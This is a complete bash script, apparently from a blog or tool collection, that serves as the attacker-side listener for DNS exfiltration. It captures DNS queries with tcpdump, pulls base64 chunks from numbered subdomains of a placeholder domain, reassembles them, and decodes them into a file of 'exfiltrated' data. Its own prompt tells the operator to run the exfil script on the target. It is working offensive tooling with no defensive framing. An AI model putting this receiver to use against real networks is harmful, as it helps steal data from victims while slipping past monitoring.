#!/bin/bash
# DNS Exfiltration Listener - JamesRivers.Tech 
# Usage: sudo ./dns_listener.sh

PCAP_FILE="dns_capture.pcap"
OUTPUT_FILE="exfiltrated_data.txt"

echo "===================================="
echo "    DNS Exfiltration Listener"
echo "===================================="
echo ""

# Check root
if [ "$EUID" -ne 0 ]; then 
    echo "Error: Run as root (sudo)"
    exit 1
fi

# Check tcpdump
if ! command -v tcpdump >/dev/null 2>&1; then
    echo "Error: tcpdump not installed"
    exit 1
fi

# Cleanup old files
rm -f "$PCAP_FILE" "$OUTPUT_FILE"

echo "[*] Capturing packets..."
echo "[*] Run exfil script on target now"
echo "[*] Press Ctrl+C when done"
echo ""

# Decode on exit
trap 'decode_data' INT TERM

decode_data() {
    echo ""
    echo "[*] Stopping capture..."
    pkill -P $$ tcpdump 2>/dev/null
    sleep 1
    
    echo "[*] Decoding data..."
    
    # Check file exists
    if [ ! -s "$PCAP_FILE" ]; then
        echo "Error: No packets captured"
        exit 1
    fi
    
    # Decode
    tcpdump -n -r "$PCAP_FILE" 2>/dev/null | \
        grep -oE '[0-9]+\.[a-zA-Z0-9+/=]+\.yourdomain\.com' | \
        sort -t. -k1 -n | \
        cut -d. -f2 | \
        tr -d '\n' | \
        base64 -d > "$OUTPUT_FILE" 2>/dev/null
    
    # Show result
    if [ -s "$OUTPUT_FILE" ]; then
        echo ""
        echo "===================================="
        echo "[+] Success!"
        echo "[+] Saved to: $OUTPUT_FILE"
        echo "===================================="
        echo ""
        head -20 "$OUTPUT_FILE"
        echo ""
    else
        echo "Error: Decoding failed"
        exit 1
    fi
    
    exit 0
}

# Start capture
tcpdump -i any -n -l 'udp and dst port 53' -w "$PCAP_FILE" 2>&1
